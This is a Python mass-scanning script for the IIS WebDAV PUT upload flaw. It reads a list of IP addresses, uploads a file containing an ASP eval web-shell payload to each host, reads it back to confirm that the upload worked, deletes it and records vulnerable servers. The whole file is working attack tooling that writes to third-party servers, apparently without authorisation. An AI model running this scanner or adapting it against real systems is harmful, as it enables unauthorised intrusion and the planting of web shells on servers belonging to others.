#!/usr/bin/env python3
# coding:utf-8
# IIS PUT 上传漏洞检测脚本
# author：ske
# usage: python3 iis_put_multi.py /root/unAuth/IIS/us.txt 10


import requests
import threading
from queue import Queue
import sys

event = threading.Event()
event.set()
q = Queue(-1)

class multi_thread(threading.Thread):
    def __init__(self,num,q):
        threading.Thread.__init__(self)
        self.num = num
        self.q = q
        self.commands = 'echo "test:)" | tee index1.txt'

    def run(self):
        while event.is_set():                                               #is_set()查看信号，由于之前设置了Flag为True，所以为真
            if self.q.empty():                                              #如果队列空了就跳出循环，终止
                event.clear()
            else:                                                           #如果队列不为空
                ip = self.q.get()
                self.check_redis(ip)

    def check_redis(self, ip):
        target = 'http://' + ip
        try:
            url = '{}/2222.txt'.format(target)
            data = '<%eval request("1111111111")%>'
            requests.put(url=url, data=data, timeout=5)
            html_text = requests.get(url).text
            if '<%eval request("1111111111")%>' in html_text:
                print('[+] -> [{}] : {} 存在IIS PUT上传'.format(self.num, ip))
                requests.delete(url)
                print('[+] -> [{}] : {} 成功删除测试文件'.format(self.num, ip))
                self.save(ip)
            else:
                print('[-] -> [{}] : {} 不存在IIS PUT上传'.format(self.num, ip))
        except Exception as e:
            print('[error] -> [{}] : {} . {}'.format(self.num, ip, e.args))

    def save(self, ip):
        with open('success.txt', 'at') as f:
            f.writelines(ip + '\n')

def scan_thread():                                                         #参数是队列
    threads = []
    for num in range(1,thread_num+1):
        t = multi_thread(num,q)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def get_ip():
    with open(path, 'rt') as f:
        for ip in f.readlines():
            q.put(ip.strip())

if __name__ == '__main__':
    path = sys.argv[1]  # /root/unAuth/redis/us.txt
    thread_num = int(sys.argv[2])
    get_ip()
    scan_thread()